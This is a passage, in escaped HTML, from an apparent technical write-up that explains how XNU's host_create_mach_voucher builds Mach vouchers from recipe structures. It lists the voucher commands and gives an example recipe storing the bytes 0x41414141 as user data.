 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;kern_return_t&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;host_create_mach_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_port_name_t host&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_raw_recipe_array_t recipes&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_size_t recipesCnt&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; mach_port_name_t &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;recipes&lt;/span&gt;&lt;span&gt;&amp;nbsp;points to a buffer filled with a sequence of packed variable-size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;mach_voucher_attr_recipe_data&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;structures:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.fb086444030469a009e799e34240bece6d1dd33b&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.12&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;typedef&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;mach_voucher_attr_recipe_data &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; mach_voucher_attr_recipe_command_t command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; mach_voucher_name_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;previous_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; uint8_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;key&lt;/span&gt;&lt;span&gt;&amp;nbsp;is one of the four supported voucher attr types we&amp;#39;ve seen before (importance, bank, pthread_priority and user_data) or a wildcard value (&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_KEY_ALL&lt;/span&gt;&lt;span&gt;) indicating that the command should apply to all keys. There are a number of generic commands as well as type-specific commands. Commands can optionally refer to existing vouchers via the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;previous_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;field, which should name a voucher port.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Here are the supported generic commands for voucher creation:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_COPY&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;: copy the attr value from the previous voucher. You can specify the wildcard key to copy all the attr values from the previous voucher.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_REMOVE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;: remove the specified attr value from the voucher under construction. This can also remove all the attributes from the voucher under construction (which, arguably, makes no sense.)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_SET_VALUE_HANDLE:&lt;/span&gt;&lt;span&gt;&amp;nbsp;this command is only valid for kernel clients; it allows the caller to specify an arbitrary &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;, which doesn&amp;#39;t make sense for userspace and shouldn&amp;#39;t be reachable.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span&gt;: the semantics of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c14&quot;&gt;redeeming&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;an attribute from a previous voucher are not defined by the voucher code; it&amp;#39;s up to the individual managers to determine what that might mean.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Here are the attr-specific commands for voucher creation for each type:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;bank&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11 BGLtzooHlW-c19&quot;&gt;MACH_VOUCHER_ATTR_BANK_CREATE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_BANK_MODIFY_PERSONA&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_AUTO_REDEEM&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_SEND_PREPROCESS&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;importance&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_IMPORTANCE_SELF&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;pthread_priority&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_ATTR_PTHPRIORITY_CREATE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Note that there are further commands which can be &amp;quot;executed against&amp;quot; vouchers via the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;mach_voucher_attr_command&lt;/span&gt;&lt;span&gt;&amp;nbsp;MIG method which calls the attr manager&amp;#39;s&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivam_command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;function pointer. Those are:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;bank&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;BANK_ORIGINATOR_PID&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;BANK_PERSONA_TOKEN&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;BANK_PERSONA_ID&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;importance&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c19 BGLtzooHlW-c11&quot;&gt;MACH_VOUCHER_IMPORTANCE_ATTR_DROP_EXTERNAL&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;none&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;pthread_priority&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;none&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Let&amp;#39;s look at example recipe for creating a voucher with a single &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;attr, consisting of the 4 bytes {0x41, 0x41, 0x41, 0x41}:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.a9632b719aa64a5ca7f22f3e9944b5fd0708e9e6&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.13&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;udata_dword_recipe &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; mach_voucher_attr_recipe_data_t recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; uint32_t payload&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;udata_dword_recipe r &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;command &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;content_size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;payload &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Let&amp;#39;s follow the path of this recipe in detail.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Here&amp;#39;s the most important part of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;host_create_mach_voucher&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;showing the three high-level phases: voucher allocation, attribute creation and voucher de-duping. It&amp;#39;s not the responsibility of this code to find or allocate a mach port for the voucher; that&amp;#39;s done by the MIG layer code.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.caafa58444ef86dee8c472d187debed00ee56da7&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.14&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* allocate new voucher */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;voucher &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iv_alloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivgt_keys_in_use&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
